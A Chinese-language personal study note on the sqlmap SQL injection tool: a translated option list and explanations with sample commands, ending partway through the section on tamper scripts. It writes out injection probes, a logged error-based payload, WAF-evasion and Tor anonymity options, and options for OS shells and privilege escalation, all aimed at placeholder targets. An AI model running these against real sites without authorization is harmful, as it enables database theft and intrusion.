---
SQLmap 笔记

---

本笔记主要是参照网上已有的手册, 加上本人个人的一下实际操作检验得出来的.  希望对所有后来者有些许的帮助!!!

# 官网使用Wiki

https://github.com/sqlmapproject/sqlmap/wiki/Usage

# sqlmap用法

## 前置知识(注意点) 

> 本部分主要是对于sql相关知识的简单说明, 具体关于sql注入的部分, 之后会有`sql注入原理笔记`. 

### sql注入简单检测

> 对于可能有sql注入的网页的举例:
>
> ```shell
> # 原来的url
> http://example.com/test.php?id= 1
> ```
>
> ```shell
> # 第一次尝试的url
> http://example.com/test.php?id = 1 and 1 = 1 
> 
> # 第二次尝试的url
> http://example.com/test.php?id= 1 and 1 = 2 
> ```
>
> 如果 **第一次的url**正常, **第二次的url正常**, 那么`test.php`这个页面就可能存在`sql注入`



> # `sqlmap`使`python`写的, 但是,**不是`python3`** , 运行环境是`pythoN2`!!!!



> sqlmap 支持的数据库有很多, 包括: 

- 完全支持 **MySQL**，**Oracle**，**PostgresSQL**，**Microsoft SQL Server**，**Microsoft Access**，**IBM DB2**，**SQLite**，**Firebird**，**Sybase**，**SAP MaxDB** 和 **HSQLDB** 数据库管理系统。

> sqlmap有个 `-v`参数, 一共有 7个等级信息(**默认为: 1**):
>
> - **0**：只输出 Python 出错回溯信息，错误和关键信息。
> - **1**：增加输出普通信息和警告信息。
> - **2**：增加输出调试信息。
> - **3**：增加输出已注入的 payloads。
> - **4**：增加输出 HTTP 请求。
> - **5**：增加输出 HTTP 响应头
> - **6**：增加输出 HTTP 响应内容。
>
> ```
> # 使用技巧:一个v 就是多查询一个等级
> -vv   相当于  -v2
> -vvv  相当于  -v3 
> 其他的一次类推
> ```



# sqlmap的所有参数

> **注意:**
>
> 1. 默认情况下, sqlmap会测试 **所有的GET和POST参数**
> 2. `--level`的值大于等于2 的时候, 还会测试 `Cookie`的值
> 3. `--level`的值大于等于3的时候, 还会测试`User-Agent` 和 `Referer`
> 4. sqlmap也允许我们通过 `逗号`来分隔我们想要手动指定的参数.

```
选项：
  -h, --help            显示基本帮助信息并退出
  -hh                   显示高级帮助信息并退出
  --version             显示程序版本信息并退出
  -v VERBOSE            输出信息详细程度级别：0-6（默认为 1）

  目标：
      至少提供一个以下选项以指定目标

    -d DIRECT           直接连接数据库
    -u URL, --url=URL   目标 URL（例如："http://www.site.com/vuln.php?id=1"）
    -l LOGFILE          从 Burp 或 WebScarab 代理的日志文件中解析目标地址
    -x SITEMAPURL       从远程网站地图（.xml）文件中解析目标
    -m BULKFILE         从文本文件中获取批量目标
    -r REQUESTFILE      从文件中读取 HTTP 请求
    -g GOOGLEDORK       使用 Google dork 结果作为目标
    -c CONFIGFILE       从 INI 配置文件中加载选项

  请求：
      以下选项可以指定连接目标地址的方式

    --method=METHOD     强制使用提供的 HTTP 方法（例如：PUT）
    --data=DATA         使用 POST 发送数据串
    --param-del=PARA..  设置参数值分隔符
    --cookie=COOKIE     指定 HTTP Cookie 
    --cookie-del=COO..  设置 cookie 分隔符
    --load-cookies=L..  指定以 Netscape/wget 格式存放 cookies 的文件
    --drop-set-cookie   忽略 HTTP 响应中的 Set-Cookie 参数
    --user-agent=AGENT  指定 HTTP User-Agent
    --random-agent      使用随机的 HTTP User-Agent
    --host=HOST         指定 HTTP Host
    --referer=REFERER   指定 HTTP Referer
    -H HEADER, --hea..  设置额外的 HTTP 头参数（例如："X-Forwarded-For: 127.0.0.1"）
    --headers=HEADERS   设置额外的 HTTP 头参数（例如："Accept-Language: fr\nETag: 123"）
    --auth-type=AUTH..  HTTP 认证方式（Basic，Digest，NTLM 或 PKI）
    --auth-cred=AUTH..  HTTP 认证凭证（username:password）
    --auth-file=AUTH..  HTTP 认证 PEM 证书/私钥文件
    --ignore-code=IG..  忽略 HTTP 错误码（例如：401）
    --ignore-proxy      忽略系统默认代理设置
    --ignore-redirects  忽略重定向尝试
    --ignore-timeouts   忽略连接超时
    --proxy=PROXY       使用代理连接目标 URL
    --proxy-cred=PRO..  使用代理进行认证（username:password）
    --proxy-file=PRO..  从文件中加载代理列表
    --tor               使用 Tor 匿名网络
    --tor-port=TORPORT  设置 Tor 代理端口代替默认端口
    --tor-type=TORTYPE  设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认））
    --check-tor         检查是否正确使用了 Tor
    --delay=DELAY       设置每个 HTTP 请求的延迟秒数
    --timeout=TIMEOUT   设置连接响应的有效秒数（默认为 30）
    --retries=RETRIES   连接超时时重试次数（默认为 3）
    --randomize=RPARAM  随机更改给定的参数值
    --safe-url=SAFEURL  测试过程中可频繁访问且合法的 URL 地址（译者注：
                        有些网站在你连续多次访问错误地址时会关闭会话连接，
                        后面的“请求”小节有详细说明）
    --safe-post=SAFE..  使用 POST 方法发送合法的数据
    --safe-req=SAFER..  从文件中加载合法的 HTTP 请求
    --safe-freq=SAFE..  每访问两次给定的合法 URL 才发送一次测试请求
    --skip-urlencode    不对 payload 数据进行 URL 编码
    --csrf-token=CSR..  设置网站用来反 CSRF 攻击的 token
    --csrf-url=CSRFURL  指定可提取反 CSRF 攻击 token 的 URL
    --force-ssl         强制使用 SSL/HTTPS
    --hpp               使用 HTTP 参数污染攻击
    --eval=EVALCODE     在发起请求前执行给定的 Python 代码（例如：
                        "import hashlib;id2=hashlib.md5(id).hexdigest()"）

  优化：
    以下选项用于优化 sqlmap 性能

    -o                  开启所有优化开关
    --predict-output    预测常用请求的输出
    --keep-alive        使用持久的 HTTP(S) 连接
    --null-connection   仅获取页面大小而非实际的 HTTP 响应
    --threads=THREADS   设置 HTTP(S) 请求并发数最大值（默认为 1）

  注入：
    以下选项用于指定要测试的参数，
    提供自定义注入 payloads 和篡改参数的脚本

    -p TESTPARAMETER    指定需要测试的参数
    --skip=SKIP         指定要跳过的参数
    --skip-static       指定跳过非动态参数
    --param-exclude=..  用正则表达式排除参数（例如："ses"）
    --dbms=DBMS         指定 DBMS 类型（例如：MySQL）
    --dbms-cred=DBMS..  DBMS 认证凭据（username:password）
    --os=OS             指定 DBMS 服务器的操作系统类型
    --invalid-bignum    将无效值设置为大数
    --invalid-logical   对无效值使用逻辑运算
    --invalid-string    对无效值使用随机字符串
    --no-cast           关闭 payload 构造机制
    --no-escape         关闭字符串转义机制
    --prefix=PREFIX     注入 payload 的前缀字符串
    --suffix=SUFFIX     注入 payload 的后缀字符串
    --tamper=TAMPER     用给定脚本修改注入数据

  检测：
    以下选项用于自定义检测方式

    --level=LEVEL       设置测试等级（1-5，默认为 1）
    --risk=RISK         设置测试风险等级（1-3，默认为 1）
    --string=STRING     用于确定查询结果为真时的字符串
    --not-string=NOT..  用于确定查询结果为假时的字符串
    --regexp=REGEXP     用于确定查询结果为真时的正则表达式
    --code=CODE         用于确定查询结果为真时的 HTTP 状态码
    --text-only         只根据页面文本内容对比页面
    --titles            只根据页面标题对比页面

  技术：
    以下选项用于调整特定 SQL 注入技术的测试方法

    --technique=TECH    使用的 SQL 注入技术（默认为“BEUSTQ”，译者注：
                        B: Boolean-based blind SQL injection（布尔型盲注）
                        E: Error-based SQL injection（报错型注入）
                        U: UNION query SQL injection（联合查询注入）
                        S: Stacked queries SQL injection（堆查询注入）
                        T: Time-based blind SQL injection（时间型盲注）
                        Q: inline Query injection（内联查询注入）
    --time-sec=TIMESEC  延迟 DBMS 的响应秒数（默认为 5）
    --union-cols=UCOLS  设置联合查询注入测试的列数目范围
    --union-char=UCHAR  用于暴力猜解列数的字符
    --union-from=UFROM  设置联合查询注入 FROM 处用到的表
    --dns-domain=DNS..  设置用于 DNS 渗出攻击的域名（译者注：
                        推荐阅读《在SQL注入中使用DNS获取数据》
                        http://cb.drops.wiki/drops/tips-5283.html，
                        在后面的“技术”小节中也有相应解释）
    --second-order=S..  设置二阶响应的结果显示页面的 URL（译者注：
                        该选项用于二阶 SQL 注入）

  指纹识别：
    -f, --fingerprint   执行广泛的 DBMS 版本指纹识别

  枚举：
      以下选项用于获取后端数据库管理系统的信息，结构和数据表中的数据。
      此外，还可以运行你输入的 SQL 语句

    -a, --all           获取所有信息、数据
    -b, --banner        获取 DBMS banner
    --current-user      获取 DBMS 当前用户
    --current-db        获取 DBMS 当前数据库
    --hostname          获取 DBMS 服务器的主机名
    --is-dba            探测 DBMS 当前用户是否为 DBA（数据库管理员）
    --users             枚举出 DBMS 所有用户
    --passwords         枚举出 DBMS 所有用户的密码哈希
    --privileges        枚举出 DBMS 所有用户特权级
    --roles             枚举出 DBMS 所有用户角色
    --dbs               枚举出 DBMS 所有数据库
    --tables            枚举出 DBMS 数据库中的所有表
    --columns           枚举出 DBMS 表中的所有列
    --schema            枚举出 DBMS 所有模式
    --count             获取数据表数目
    --dump              导出 DBMS 数据库表项
    --dump-all          导出所有 DBMS 数据库表项
    --search            搜索列，表和/或数据库名
    --comments          获取 DBMS 注释
    -D DB               指定要枚举的 DBMS 数据库
    -T TBL              指定要枚举的 DBMS 数据表
    -C COL              指定要枚举的 DBMS 数据列
    -X EXCLUDECOL       指定要排除的 DBMS 数据列
    -U USER             指定枚举的 DBMS 用户
    --exclude-sysdbs    枚举所有数据表时，指定排除特定系统数据库
    --pivot-column=P..  指定主列
    --where=DUMPWHERE   在转储表时使用 WHERE 条件语句
    --start=LIMITSTART  指定要导出的数据表条目开始行数
    --stop=LIMITSTOP    指定要导出的数据表条目结束行数
    --first=FIRSTCHAR   指定获取返回查询结果的开始字符位
    --last=LASTCHAR     指定获取返回查询结果的结束字符位
    --sql-query=QUERY   指定要执行的 SQL 语句
    --sql-shell         调出交互式 SQL shell
    --sql-file=SQLFILE  执行文件中的 SQL 语句

  暴力破解：
    以下选项用于暴力破解测试

    --common-tables     检测常见的表名是否存在
    --common-columns    检测常用的列名是否存在

  用户自定义函数注入：
    以下选项用于创建用户自定义函数

    --udf-inject        注入用户自定义函数
    --shared-lib=SHLIB  共享库的本地路径

  访问文件系统：
    以下选项用于访问后端数据库管理系统的底层文件系统

    --file-read=RFILE   读取后端 DBMS 文件系统中的文件
    --file-write=WFILE  写入后端 DBMS 文件系统中的文件
    --file-dest=DFILE   使用文件绝对路径写入到后端 DBMS

  访问操作系统：
    以下选项用于访问后端数据库管理系统的底层操作系统

    --os-cmd=OSCMD      执行操作系统命令
    --os-shell          调出交互式操作系统 shell
    --os-pwn            调出 OOB shell，Meterpreter 或 VNC
    --os-smbrelay       一键调出 OOB shell，Meterpreter 或 VNC
    --os-bof            利用存储过程的缓冲区溢出
    --priv-esc          数据库进程用户提权
    --msf-path=MSFPATH  Metasploit 框架的本地安装路径
    --tmp-path=TMPPATH  远程临时文件目录的绝对路径

  访问 Windows 注册表：
    以下选项用于访问后端数据库管理系统的 Windows 注册表

    --reg-read          读取一个 Windows 注册表键值
    --reg-add           写入一个 Windows 注册表键值数据
    --reg-del           删除一个 Windows 注册表键值
    --reg-key=REGKEY    指定 Windows 注册表键
    --reg-value=REGVAL  指定 Windows 注册表键值
    --reg-data=REGDATA  指定 Windows 注册表键值数据
    --reg-type=REGTYPE  指定 Windows 注册表键值类型

  通用选项：
    以下选项用于设置通用的参数

    -s SESSIONFILE      从文件（.sqlite）中读入会话信息
    -t TRAFFICFILE      保存所有 HTTP 流量记录到指定文本文件
    --batch             从不询问用户输入，使用默认配置
    --binary-fields=..  具有二进制值的结果字段（例如："digest"）
    --check-internet    在访问目标之前检查是否正常连接互联网
    --crawl=CRAWLDEPTH  从目标 URL 开始爬取网站
    --crawl-exclude=..  用正则表达式筛选爬取的页面（例如："logout"）
    --csv-del=CSVDEL    指定输出到 CVS 文件时使用的分隔符（默认为“,”）
    --charset=CHARSET   指定 SQL 盲注字符集（例如："0123456789abcdef"）
    --dump-format=DU..  导出数据的格式（CSV（默认），HTML 或 SQLITE）
    --encoding=ENCOD..  指定获取数据时使用的字符编码（例如：GBK）
    --eta               显示每个结果输出的预计到达时间
    --flush-session     清空当前目标的会话文件
    --forms             解析并测试目标 URL 的表单
    --fresh-queries     忽略存储在会话文件中的查询结果
    --har=HARFILE       将所有 HTTP 流量记录到一个 HAR 文件中
    --hex               获取数据时调用 DBMS 的 hex 函数
    --output-dir=OUT..  自定义输出目录路径
    --parse-errors      从响应中解析并显示 DBMS 错误信息
    --save=SAVECONFIG   将选项设置保存到一个 INI 配置文件
    --scope=SCOPE       用正则表达式从提供的代理日志中过滤目标
    --test-filter=TE..  根据 payloads 和/或标题（例如：ROW）选择测试
    --test-skip=TEST..  根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试
    --update            更新 sqlmap

  其他选项：
    -z MNEMONICS        使用短助记符（例如：“flu,bat,ban,tec=EU”）
    --alert=ALERT       在找到 SQL 注入时运行 OS 命令
    --answers=ANSWERS   设置问题答案（例如：“quit=N,follow=N”）
    --beep              出现问题提醒或在发现 SQL 注入时发出提示音
    --cleanup           指定移除 DBMS 中的特定的 UDF 或者数据表
    --dependencies      检查 sqlmap 缺少什么（非核心）依赖
    --disable-coloring  关闭彩色控制台输出
    --gpage=GOOGLEPAGE  指定页码使用 Google dork 结果
    --identify-waf      针对 WAF/IPS/IDS 保护进行彻底的测试
    --mobile            使用 HTTP User-Agent 模仿智能手机
    --offline           在离线模式下工作（仅使用会话数据）
    --purge-output      安全地删除输出目录的所有内容
    --skip-waf          跳过启发式检测 WAF/IPS/IDS 保护
    --smart             只有在使用启发式检测时才进行彻底的测试
    --sqlmap-shell      调出交互式 sqlmap shell
    --tmp-dir=TMPDIR    指定用于存储临时文件的本地目录
    --web-root=WEBROOT  指定 Web 服务器根目录（例如："/var/www"）
    --wizard            适合初级用户的向导界面
```



> **本文具体内容:**

```
# 本部分主要是具体介绍参数的使用
直接 ctrl + F  搜索就行

目标 
请求
优化
注入
测试
检测
技术
指纹识别
枚举
暴力破解
用户自定义函数注入
访问文件系统
接管操作数据
范文Windows注入表
常规选项
杂项
API

```



# 1. 目标参数

> 本部分的参数, 是用来对拿到的**目标**进行的操作. 
>
> 总结: 
>
> 1. sqlmap 不仅可以对单站进行扫描, 而且可以批量对url进行扫描
> 2. sql 可以实现多种数据的扫描, 包括 :`url , xml , http的原始数据包, 配置文件(ini, conf)`
> 3. sqlmap可以实现和google语法, bp 的联动. 

## -d

> 针对单一的数据库

```
python sqlmap.py -d "mysql://admin:admin@192.168.21.17:3306/testdb" -f --bann\
er --dbs --users
```

## -l

```
# 批量扫描url, 当然, 通过设置代理, sqlmap可以实现与bp的联动, nice!!!
# 假设 test.txt 里面是我们要扫描的
sqlmap -l test.txt   
```

## -m

```
# 这个参数和 -l 功能类似, 都是批量处理目标url
# 文件中的url要符合规范, 一个url 就是一行

sqlmap -m test.txt
```

> **sqlmap的 -m 参数和 -l 参数的区别**
>
> -m : 直接一个个加载测试每个已经知道的url
>
> -l : 通过交互使得测试, 比如sqlmap正在扫描某个网站, 如果发现了它的某个其他的域名, 这个时候在黑窗口上就会询问使用者, 要不要对这个新发现的url进行扫描啊. 



## -u

> 针对单一目标的url

```
# 获取一些指纹, 数据库的标识, 爆破数据库名字 , 爆破用户名

python sqlmap.py -u "http://www.target.com/vuln.php?id=1" -f --banner --dbs --users
```

## -x

```
# 这个参数
# 在基于单个或者批量请求的时候 直接带上这个参数就行
# 从sitemap.xml中解析访问目标. 适用于无法直接访问和暴露给sqlmap的目标.

-x http://www.target.com/sitemap.xml
```



## -r 

```
# 直接读取的不是url , 而是 http原始数据包
# 这样的效果就是, 不用通过重复的抓包在手工对某一个站点重复的的测试.
sqlmap -r test.txt

要加载的文件的内容, 类似下方格式:
POST /vuln.php HTTP/1.1
Host: www.target.com
User-Agent: Mozilla/4.0

id=1
```

## -g

```
# 结果参数实现的sqlmap 与 google 高级语法的联动
# sqlmap 会和 Google浏览器实现会话, 然后拿到100个url,
# 带上 cookeie , get请求 等, 询问使用者是否对拿到的站点记性扫描

python sqlmap.py -g "inurl:\".php?id=1\""
```



## -c

```
# 这个参数支持 sqlmap 从配置文件中读取并发送请求
# 这个配置文件时是使用者自定义的, 也就是我们自己写的, 检测我们想让sqlmap测试的语句.
# 但是如果在命令行里面指定配置参数, 那么配置文件将会失效

sqlmap -u 目标网站 -c 配置文件
```



# 2. 请求参数

> 本部分介绍的是
>
> 对于 **HTTP**请求的相关参数的更改
>
> 对于CSRF, HTTP 验证的绕过
>
> 对于 代理的添加的匿名措施
>
> 对于自定义python代码的添加
>
> 对于反之会话注销
>
> 相关参数的介绍



## --method

```
# 本参数用于指定 sqlmap发起请求的方法, 默认是 http请求
# 当然也可以指定, GET, PUT, DELETE等 , 如果是any那就是任意一种
--method=PUT
--method=any 
```



## --data

```
# 将 http 默认的get 请求改为 post, 用来测试有没有了漏洞的

sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1" -f --banne\
r --dbs --users
```



## --param-del

```
# 覆盖默认的参数分隔符, 例如 get 和 post的数据中的 &

python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=\
1" --param-del=";" -f --banner --dbs --users

```



## cookie相关参数

```
# 参数如下:
--cookie
--cookie-del
--load-cookies
--drop-set-cookie

# 主要针对的是 http请求头部分的sql注入的检测 , 以及 cookie身份的验证

--cookie 的内容可以从浏览器中拿到
--cookie-del       # 是针指定cookie的分隔符的, 因为http的cookie默认是 ; (分号)
                   # 如果不是; 分隔, 那就用这个参数

--drop-set-cookie   # 在测试的过程中, 数据中可能会有 Set-cookie响应字段
                    # sqlmap是自动检测该字段是否有漏洞的, 所以如果想要关闭这个功能
                    # 直接使用本参数就行
                    
--load-cookies      # sqlmap可以对 Netscape /wget 格式的特殊文件检测, 提取cookie(如果文件有的话)
                    # 本字段即使针对这种文件的

```



## User-Agent 相关参数

```
参数如下:
--user-agent
--random-agent

# --user-agent       # 是用来指定User-Agent的, 也就是不使用真实的User-Agent
# --random-agent     # 是从一个已经准备好的文件中比如txt文件中, 随机挑选一个user-agent来使用
                     # 
                    
```

> 注意: 由于`User-Agent`不是原来的那个真实的, 所以在测试的时候可能由于准备的`User-Agent`不正确而报错 , **报错如下**:
>
> ```
> #[hh:mm:20] [ERROR] the target URL responded with an unknown HTTP status code, try to 
> force the HTTP User-Agent header with option --user-agent or --random-agent
> 译：
> [hh:mm:20] [错误] 目标网址回复了未知的 HTTP 状态码，请尝试使用选项 --user-agent 或 
> --random-agent 强制指定 HTTP User-Agent 请求头
> ```





## --host

```
# 用于手动指定host请求头, 如果不指定默认使用真实的host
```



## --referer

```
# 用于伪造referer请求头
# 如果不指定该参数, sqlmap是不会对referer进行检测的
```



## --headers

> 用于添加额外的 **Http参数**的 , **`每个请求头都要用换行符分隔`**

```
sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" -z \
"ign,flu,bat,tec=E" --headers="Host:www.target.com\nUser-agent:Firefox 1.0" -v 5
[...]
[xx:xx:44] [TRAFFIC OUT] HTTP request [#5]:
GET /sqlmap/mysql/get_int.php?id=1%20AND%20%28SELECT%209351%20FROM%28SELECT%20C\
OUNT%28%2A%29%2CCONCAT%280x3a6161733a%2C%28SELECT%20%28CASE%20WHEN%20%285473%20\
%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\
20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\
0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\
%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\
20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\
0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\
%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\
20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\
0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\
%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3D%20%20%20%20%20%20%20%\
20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\
0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\
%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\
20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\
0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\
%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\
20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\
0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\
%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\
20%20%20%20%20%20%20%20%20%20%20%205473%29%20THEN%201%20ELSE%200%20END%29%29%2C\
0x3a6c666d3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARA\
CTER_SETS%20GROUP%20BY%20x%29a%
29 HTTP/1.1
Host: www.target.com
Accept-encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-agent: Firefox 1.0
Connection: close
[...]
```



## HTTP认证

> sqlmap支持的三种HTTP认证机制:
>
> `Basic` , `Digest`  ,`NTLM`
>
> 认证的语法为: `username: password`

```
sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id\
=1" --auth-type Basic --auth-cred "testuser:testpass"
```



## --auth-file

> 用于HTTP的 **`私钥认证`**

```
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout auth_file.key -out auth_file.pem &&\
cat auth_file.key auth_file.pem > auth_file.txt && cat auth_file.txt
```



## --ignore-401

> 用于关闭 **401**错误提醒. 这样使用者在使用的时候就不会看到一堆的 **401**



## HTTP代理相关参数

```
--proxy
--proxy-cred
--proxy-file
--ignore-proxy

--proxy             # 用于指定使用的代理的, 代理语法为   http://url:prot
--proxy-cred        # 由于有些代理需要身份验证, 此时用改参数
                    # 添加凭证的方式为  usrname:password
                    
--proxy-file        # 用于有代理池的使用者, 一个ip不行就换下一个ip

--ignore-proxy      # 来绕过系统级的 HTTP(S) 代理服务, 用于本地局域网的测试

```



## Tor匿名相关参数

> 其实还是一个代理的问题, 用来**保持匿名**的,  只不过这个是用 `tor`进行代理的. 
>
> 前提: 已经通过Tor 安装了 `Tor客户端` 和 `Privoxy`

```
--tor
--tor-port
--tor-type
--check-tor


--check-tor      # 用来确保sqlmap是否真的正常连接了tor
                 # 如果要用tor, 一定要用这个参数检查一下, 以防万一.               
--tor            # 让sqlmap连接tor
--tor-type       # 指定连接的tor类型
--tor-port       # 指定连接的tor端口
								# 例如 --tor-type=SOCKS5 --tor-prot9050


```



## --delay

> 用来设置间隔多少秒发送个请求的, 设置的时候要设置成小数才行
>
> 例如:  `10.5`表示10秒半 , **sqlmap默认是 30秒**



## --timeout

> 设置的是 在连接超时的情况下, 等待的时间, 还是要设置成 **小数**才行
>
> , **sqlmap默认的是 30秒**



## --retries

> 在一次连接失败的情况下, 尝试再次连接的次数, 比如: 第一次连接超时, 那就再来一次, 如果还不行那就再来一次发起请求.  
>
> **sqlmap默认的尝试次数是 3次** ,  也就是最多尝试3次. 



## --randomize

> 用于在测试的时候, 随机更改参数的名称



## --scope

> 利用的是 `python表达式` 来提取出所需要的目标

```
python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
```



## 避免会话注销的参数

> 也就是防止 一些sqlmap的 **流量特征的暴露**, 而被封

```
--safe-url            # 测试期间可以频繁的访问目标
--safe-post           # 使用 HTTP POST发送一个安全的url地址
--safe-req            # 从文件中加载并使用安全的HTTP
--safe-freq          # 交替执行指定的安全阀访问和 测试目标请求

```



## --skip-urlencode

> 大多数网站发送的请求都是经过url编码的, 但是也有一些是不用的, 本参数就是应对这样的请求的



## --csrf相关

> 绕过csrf的防护的

```
--csrf-token
--csrf-url
```





## --force-ssl

> 强制使用SSL/HTTPS请求, 一般和 `-l 以及 -crawl` 联合使用, 效果较好



## --eval

> 每次请求期间都可以运行自定义好的python代码 , 例子如下:

```
python sqlmap.py -u "http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b9238\
20dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
```



# 3. 优化

> 本部分主要是对于 **sqlmap使用过程中的一些优化参数的介绍**.包括
>
> 线程的设置相关参数
>
> 持久化连接
>
> 更快的进行测试的参数



## -o

```
# -o 参数会自动开启(隐含开启)下面的参数

--keep-alive
--null-connection
--threads=3
```



## --predict-output

> 本参数用于  **线性数据预测** , 算法推导的
>
> **这个参数不可与 ` --threads  `联用**



## --threads

> 用于设置最大并发数的. 
>
> **sqlmap的每个线程最多发起 `7 `次 HTTP请求**
>
> 最大并发请求数只能设置为 `10`



## --keep-alive

> 这个参数用于 **Http持久化连接**
>
> **这个参数不可与 `--proxy`**联用



## --null-connection

> 这个参数会通过判断`HTTP响应的大小`来通过两种 `NULL`连接技术----`Range 或者 HEAD` 来判断是否, 连接成功. 如果满足这两种中的一种连接技术, 那就可以了 . 
>
> **这个参数经常用于 `SQL盲注`**
>
> **这个参数不能与 `--text-only`一起使用**



# 4. 测试(自定义参数)

> 一些自定义的参数



## -p

> 用于指定需要测试的参数

```
# 假如只需要测试 id 这个参数, 还有 HTTP 的 User-Agent这个参数, 格式选下:

-p "id,user-agent"
```



## --skip

> 假如我们要跳过某些不想要测试的参数, 便是用这个

```
# 当 --level 设置成 大于等于3 的时候, sqlmap会自动检测 user-agent 和 referer
# 假如使用者不想要测试 user-agent 和 referer , 则使用 --skip 来指定, 例如:

--skip "user-agent,referer"
```



## --param-exclude

>  作用: 基于 **正则表达式**来 **排除**不想要测试的参数

```
# 我要跳过包含 token 或者 session的参数的测试, 例如:
--param-exclude="token|session"
```

## URL注入

> sqlmap默认是不会对url进行测试的, 通过 **星号(*)**, 我们可以指定对url中的参数进行测试, 例如:

```
# 使用者想要测试value1 这个参数
sqlmap -u "http://targeturl/param1/value1*/value2"
```



## 任意注入点

> 还是通过 **星号(*)**来进行测试, 只不过这里测试的是HTTP协议的参数

```
-u       # 用于标注GET参数, 也就是 URL注入参数
--data   # 用于标注POST参数
-H       # 用于标注HTTP请求头的参数, 例如: --headers, --referer,--cookie

# 例如:
sqlmap -u "http://targeturl/varlue1*" --cookie="param1=value2*;param2=value3"
```



## --dbms

> 当我们 **非常明确的知道数据**的时候, 可以使用本参数

```
# 有个特殊的, 一个是MYSQL, 另一个是	Microsoft SQL Server 需指定版本
#格式:
MySQL <version>
Microsoft SQL Server <version>
```



## --os 

> 用于指定操作系统, 是 Windows还是 Linux

只有当我们 **非常明确的知道** 数据库所在的操作系统的时候才用此项来提高测试效率



## 强制无效参数

**--invalid-bignum**

> 这个参数就是强制让 `sqlmap 使用大数, 来让参数无效`
>
> 例如: 人常用的是 `id = -1` 之类的让参数无效, 而`--invalid-bignum`x效果是 `id=9999999999999999` 来使其无效.结果其实是一样的.



**--invalid-logical**

> 作用让测试的参数无效, sqlmap会自动使用如下语句达到无效.
>
> `id=13 and 18=19`



**--invalid-string**

> 强制使用字符串来达到无效, id本来应该是一个数字的, 但是sqlmap会将其改为字符串. 
>
> id = akewmmw



##  --no-cast

> 对于SQLmap返回为None的时候, 可能是测试的数据库本身的问题, 此时需要用 `--no-cast`来试试. 



## --no-escape

> 当sqlmap构造的paytload中含有字符串的时候, 都会用 **单引号**引起来, 这些单引号 **都别转义了** , 会变成一个很长的东东. 这个时候后 `payload`就会很长, 而如果不想要这样(也就是说使用正常的 单引号), 便是用`--no-escape` , 来关闭sqlmap这种转义机制



## 自定义payload

**--prefix**  和 **--suffix**

> 但我们**知道底层mysql查询语法**的时候, 通过指定特定的注入来进行检测, 便是用这两个参数

```
# 底层的sql语句
$query = "SELECT * FROM users WHERE id=('" . $_GET['id'] . "') LIMIT 0, 1";
```

```
# sqlmap的使用
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php\
?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc"
[...]


# 实际上, 上方的查询作用如下:
$query = "SELECT * FROM users WHERE id=('1') <PAYLOAD> AND ('abc'='abc') LIMIT 0, 1";
```



## --tamper

> 说的直白一点, 这个选项就是用来绕过waf的. 
>
> 通过对payload进行注意来实现混淆的. 
>
> 可以通过编辑sqlmap的 `tamper`文件夹下的脚本来时编辑. 
>
> 一下是网上的例子:

```
# 指定的参数
--tamper="between,randomcase"



# 编辑的python文件的格式
# Needed imports
from lib.core.enums import PRIORITY

# Define which is the order of application of tamper scripts against
# the payload
__priority__ = PRIORITY.NORMAL

def tamper(payload):
    '''
    Description of your tamper script
    '''

    retVal = payload

    # your code to tamper the original payload

    # return the tampered payload
    return retVal



# 开始使用sqlmap
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --\
tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3

[hh:mm:03] [DEBUG] cleaning up configuration parameters
[hh:mm:03] [INFO] loading tamper script 'between'
[hh:mm:03] [INFO] loading tamper script 'randomcase'
[hh:mm:03] [INFO] loading tamper script 'space2comment'
[...]
[hh:mm:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[hh:mm:04] [PAYLOAD] 1)/**/And/**/1369=7706/**/And/**/(4092=4092
